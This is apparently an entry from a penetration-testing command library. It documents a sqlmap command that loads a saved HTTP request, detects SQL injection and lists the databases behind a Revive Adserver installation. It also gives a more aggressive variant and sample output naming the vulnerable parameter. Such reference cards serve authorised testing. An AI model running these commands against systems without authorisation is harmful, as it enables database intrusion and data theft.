---
id: cmd-sqlmap-dbs-revive
data: sqlmap -r testsql.txt --dbs
tags:
  - sqli
  - exploitation
  - enumeration
type: command
output: null
executor: bash
platforms:
  - Linux
  - Windows
  - macOS
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:15:04.910Z'
verified: false
validated: true
submitted: true
---
# sqlmap-enumerate-dbs

## Command

```bash
sqlmap -r testsql.txt --dbs
```

## Description

Loads a saved HTTP request file and uses sqlmap to detect SQL injection points, then enumerates all accessible database names on the target MySQL backend, confirming exploitation in Revive Adserver.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| -r | Load HTTP request from the specified file | Yes |
| --dbs | Enumerate DBMS databases | Yes |
| testsql.txt | Path to the file containing the raw HTTP request | Yes |

## Examples

### Basic Usage

```bash
sqlmap -r testsql.txt --dbs
```

### Advanced Usage

```bash
sqlmap -r testsql.txt --dbs --batch --level=3
```

> --batch for non-interactive, --level=3 for deeper testing including time-based blinds.

## Expected Output

Sqlmap outputs vulnerability confirmation (e.g., 'Parameter: keyword (GET) is vulnerable') and lists databases like: available databases [3]: [*] information_schema [*] mysql [*] revive_adserver.

## Related

- [[Related Procedure: Exploit-SQL-Injection-with-Sqlmap]]
